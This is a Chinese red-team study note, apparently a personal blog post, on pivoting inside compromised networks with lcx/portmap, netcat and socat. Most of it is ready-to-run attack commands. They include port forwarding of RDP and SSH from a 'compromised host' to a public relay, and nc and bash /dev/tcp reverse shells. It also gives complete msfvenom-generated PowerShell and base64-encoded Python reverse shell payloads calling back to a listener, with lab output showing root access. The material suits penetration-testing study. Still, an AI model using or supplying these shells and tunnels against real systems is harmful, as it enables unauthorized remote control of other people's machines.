---
title: 【内网学习笔记】7、lcx、netcat和socat的使用
date: 2021-05-28 13:04:49
id: 210528-130449
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-05-28_12-36-45.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、lcx 使用

lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap

### Windows

* 内网端口转发

```
内网失陷主机
lcx.exe -slave rhost rport lhost lport

公网代理主机
lcx.exe -listen lport1 lport2
```

```
内网失陷主机
lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389

公网代理主机
lcx.exe -listen 4444 5555
```

在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。

* 本地端口映射

如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。

```
lcx.exe -tran 53 <目标主机 IP 地址> 3389
```

### Linux

* 内网端口转发

```
内网失陷主机
./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 <公网主机 IP> -p2 4444

公网代理主机
./portmap -m 2 -p1 4444 -h2 <公网主机 IP> -p2 5555
```

此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。

## 2、netcat 使用

nc 下载地址：[https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。

```
-l 开启监听状态
-v 显示详细信息
-p 指定监听的本地端口
-k 客户端断掉连接时，服务端依然保持运行
-e 将传入的信息以命令执行
-n 直接使用 IP 地址，不进行 dns 解析过程
```

### 获取 banner 信息

个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。

```
nc -vv rhost rport
```

```
> nc -v 172.16.214.43 22
Connection to 172.16.214.43 port 22 [tcp/ssh] succeeded!
SSH-2.0-OpenSSH_8.4p1 Debian-3
```

### 反弹shell

个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd

**-e 指定反弹 shell**

```
# 失陷主机
nc -lvp lport -e /bin/bash		# linux 主机
nc -lvp lport -e c:\windows\system32\cmd.exe 	# windows 主机

# 控制端
nc rhost rport
```

```
# 失陷主机
> nc -lvp 4444 -e /bin/bash
listening on [any] 4444 ...
172.16.214.1: inverse host lookup failed: Unknown host
connect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628

# 控制端
> nc -v 172.16.214.43 4444
Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!
whoami
root
```

**-c 指定反弹 shell**

```
# 失陷主机
nc -lvp lprot -c bash	# linux 主机
nc -lvp lport -c cmd 	# windows 主机

# 控制端
nc rhost rport
```

```
# 失陷主机
> nc -lvp 4444 -c bash
listening on [any] 4444 ...
172.16.214.1: inverse host lookup failed: Unknown host
connect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635

# 控制端
> nc -v 172.16.214.43 4444
Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!
whoami
root
```

**结合其他语言进行反弹 shell**

```
# 失陷主机
bash -i >& /dev/tcp/rhost/rport 0>&1

# 控制端
nc -lvp lprot
```

```
# 失陷主机
> bash -i >& /dev/tcp/172.16.214.43/4444 0>&1

# 控制端
> nc -lp 4444
root@ubuntu:~# whoami
whoami
root
```

除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 `msfvenom -l payload | grep "cmd/"`可查看可使用的 payload

比如使用 `cmd/windows/reverse_powershell` 这个 payload

```
# 控制端
> msfvenom -p cmd/windows/reverse_powershell lhost=172.16.214.43 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 1586 bytes
powershell -w hidden -nop -c $a='172.16.214.43';$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}

> nc -lvp 4444
```

将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-05-28_12-36-45.png)

再比如使用 `cmd/unix/reverse_python` 这个payload

````
# 控制端
> msfvenom -p cmd/unix/reverse_python lhost=172.16.214.43 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 505 bytes
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"

> nc -lvp 4444
````

同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python

## 3、socat 使用

socat 下载地址：[http://www.dest-unreach.org/socat/](http://www.dest-unreach.org/socat/)，或者直接使用 `apt-get install socat` 安装，Mac 可使用 `brew install socat` 安装。

socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。

### 文件操作

**读取文件**

```
> socat - ./test.txt  	# 相对路径读取
test

> socat - /tmp/test.txt	# 绝对路径读取
test
```

**写入文件**

```
> echo "hello world" | socat - ./test.txt
> socat - ./test.txt
test
hello world
```

### 网络操作

**连接远程端口**

```
> socat - TCP:172.16.214.1:22
SSH-2.0-OpenSSH_7.4
```

**监听端口**

```
socat - TCP-LISTEN:8002
```

### 端口转发

**转发 TCP 端口**

个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。

```
socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80
```

这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd

```
socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80
```

**转发 UDP 端口**

和上面一样，将 TCP 改成 UDP 即可

```
socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80
```

**NAT 映射**

通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp

```
# 内网主机
socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389

# 公网主机
socat tcp-listen:4444 tcp-listen:5555
```

此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了

考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。

> 参考链接：
>
> [https://www.sqlsec.com/2019/10/nc.html](https://www.sqlsec.com/2019/10/nc.html)
>
> [https://www.hi-linux.com/posts/61543.html](https://www.hi-linux.com/posts/61543.html)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
